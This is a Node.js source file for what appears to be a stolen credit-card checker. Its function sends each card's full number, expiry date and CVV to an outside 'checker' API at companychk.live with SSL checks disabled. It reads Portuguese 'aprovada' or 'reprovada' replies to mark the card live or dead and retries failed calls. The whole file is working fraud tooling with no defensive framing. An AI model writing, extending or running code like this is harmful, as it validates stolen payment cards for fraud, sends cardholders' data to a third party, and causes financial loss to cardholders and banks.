const { getConfig } = require('../../configManager')
const request = require('request-promise')

module.exports = async function company(card, currentRetry = 0) {
  const { retrys, company: configs } = getConfig('checkers')

  try {
    const options = {
      url: `https://companychk.live/api/${configs.tester}.php?key=${configs.key}&cartao=${card.number}|${card.month}|${card.year}|${card.cvv}`,
      method: 'GET',
      followAllRedirects: true,
      strictSSL: false,
      timeout: 100000,
    }

    if (currentRetry >= parseInt(retrys))
      return {
        active: true,
        live: false,
        skip: true,
        output: 'Error on call api',
      }
    const result = await request(options)
    console.log(result)
    const response = (() => {
      try {
        return JSON.parse(result)
      } catch {
        return {
          active: false,
          output: 'Error on call api',
        }
      }
    })()

    const { message } = response

    if (message?.toLowerCase?.()?.includes('aprovada')) {
      return {
        active: true,
        card: card,
        live: true,
        output: response,
      }
    } else if (message?.toLowerCase?.()?.includes('reprovada')) {
      return {
        active: true,
        card: card,
        live: false,
        output: response,
      }
    } else {
      currentRetry++
      return company(card, currentRetry)
    }
  } catch (e) {
    console.log(e)

    currentRetry++
    return company(card, currentRetry)
  }
}
